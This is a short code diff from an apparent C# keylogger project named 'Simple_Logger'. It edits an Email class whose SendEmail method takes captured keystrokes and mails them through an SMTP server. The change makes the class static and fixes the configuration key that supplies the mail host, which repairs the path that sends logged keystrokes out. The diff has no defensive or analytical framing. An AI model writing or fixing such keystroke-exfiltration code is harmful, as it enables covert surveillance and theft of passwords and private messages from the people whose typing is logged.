@@ -3,7 +3,7 @@ using System.Net.Mail;
 
 namespace Simple_Logger
 {
-    public class Email
+    public static class Email
     {
         public static void SendEmail(string keystrokes)
         {
@@ -13,7 +13,7 @@ namespace Simple_Logger
 
             // Set the smtp server
 
-            client.Host = ConfigurationManager.AppSettings["service"];
+            client.Host = ConfigurationManager.AppSettings["server"];
 
             // Use TSL port
 
